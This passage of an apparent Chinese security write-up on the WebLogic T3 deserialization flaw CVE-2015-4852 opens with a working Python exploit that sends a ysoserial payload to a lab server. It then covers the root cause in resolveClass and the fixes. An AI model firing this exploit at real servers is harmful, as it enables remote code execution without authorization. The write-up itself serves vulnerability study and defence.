@@ -1,0 +1,70 @@
+    import struct
+    import re
+    import subprocess
+    import binascii
+    def get_payload1(gadget, command):
+        JAR_FILE = './ysoserial.jar'
+        popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)
+        return popen.stdout.read()
+    def get_payload2(path):
+        with open(path, "rb") as f:
+            return f.read()
+    def exp(host, port, payload):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host, port))
+        handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n".encode()
+        sock.sendall(handshake)
+        data = sock.recv(1024)
+        pattern = re.compile(r"HELO:(.*).false")
+        version = re.findall(pattern, data.decode())
+        if len(version) == 0:
+            print("Not Weblogic")
+            return
+        print("Weblogic {}".format(version[0]))
+        data_len = binascii.a2b_hex(b"00000000") #数据包长度，先占位，后面会根据实际情况重新
+        t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006") #t3协议头
+        flag = binascii.a2b_hex(b"fe010000") #反序列化数据标志
+        payload = data_len + t3header + flag + payload
+        payload = struct.pack('>I', len(payload)) + payload[4:] #重新计算数据包长度
+        sock.send(payload)
+    if __name__ == "__main__":
+        host = "192.168.1.40"
+        port = 7001
+        gadget = "Jdk7u21" #CommonsCollections1 Jdk7u21
+        command = "touch /tmp/CVE-2015-4852"
+        payload = get_payload1(gadget, command)
+        exp(host, port, payload)
+执行完成后，查看docker容器里面的文件。
+    docker exec  weblogic1036jdk7u21 ls tmp/
+执行成功。
+在执行exp的时候，如果开启debug去查看其实不难发现，发送t3的报文头信息以后会在返回包里面回显weblogic的版本号。
+可以看到，后面通过正则提取了返回包的数据，拿到该版本号信息。
+###  漏洞分析
+T3协议接收过来的数据会在`weblogic.rjvm.InboundMsgAbbrev#readObject`这里进行反序列化操作。
+来直接定位到该位置，可以看到断点的位置，里面调用了`InboundMsgAbbrev.ServerChannelInputStream#readObject`方法，查看一下
+这里调用创建一个内部类，并且调用`readObject`方法，还需要查看一下 `ServerChannelInputStream`实现。
+在这里其实就可以看到`ServerChannelInputStream`是一个内部类，该类继承`ObjectInputStream`类，而在这里对`resolveClass`进行了重写。
+但是在此处看到，其实调用的还是父类的`resolveClass`方法。在`resolveClass`方法中也没做任何的校验，导致的漏洞产生。
+后面来讲讲如何防御到该漏洞。
+###  再谈resolveClass
+`resolveClass`方法的作用是将类的序列化描述符加工成该类的Class对象。
+前面分析readObject方法的时候，我们得知了shiro就是重写了`resolveClass`方法导致很多利用链无法使用，但是shiro在编写的时候，并不是为了防御反序列化漏洞才去重写的`resolveClass`，但是就是这么一个无意间的举动，导致了防御住了大部分攻击。
+而在后面的weblogic补丁当中，也会基于这个`resolveClass`去做反序列化漏洞的防御。
+贴上一张廖师傅的博客的反序列化攻击时序图：
+那么这里需要思考到一个问题，为什么要在`resolveClass`进行一个拦截，而不是其他位置？
+`resolveClass`方法的作用是从类序列化描述符获取类的Class对象，如果在`resolveClass`中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有。
+来看到这个方法，在我的`readObject`分析文章里面贴出来一张图，`readObject`的内部使用`Class.forName`来从类序列化获取到对应类的一个Class的对象。
+那么如果这里加入一个过滤，那么这里如果直接抛出异常的话，在`readNonProxyDesc`调用完`resolveClass`方法后，后面的一系列操作都无法完成。
+###  参考文章
+    http://drops.xmd5.com/static/drops/web-13470.html
+    > [Weblogic12c T3 协议安全漫谈](https://blog.knownsec.com/2020/11/weblogic12c-t3-%e5%8d%8f%e8%ae%ae%e5%ae%89%e5%85%a8%e6%bc%ab%e8%b0%88/)
+    http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/
+    https://xz.aliyun.com/t/8443
+## 0x04 修复方案
+这里借鉴`z_zz_zzz`师傅的文章中提到的weblogic
+T3协议漏洞的修复方案，除了打补丁外还有其他的修复方案，先来说说打补丁的方式，打补丁其实也是在`resolveClass`方法中实现拦截。
+开放在外网的情况下，还可以采用web代理和负载均衡。
+web代理的方式只能转发HTTP的请求，而不会转发T3协议的请求，这就能防御住T3漏洞的攻击。
+而负载均衡的情况下，可以指定需要进行负载均衡的协议类型，这么这里就可以设置为HTTP的请求，不接收其他的协议请求转发。这也是在外网中见到T3协议漏洞比较少的原因之一。
+## 0x05 结尾
+在这里其实分析比较浅，因为反序列化操作和CC链这一块，我觉得应该单独拿出来说，而不是集成到这个T3协议漏洞里面一并概述。所以在此处并没有对这两块内容进行分析，而这两块内容在前面都有进行分析过，自行查阅。后面的几个T3协议的漏洞，其实也是基于`resolveClass`的方式进行拦截过后的一个绕过方式，成了一个新的CVE漏洞。
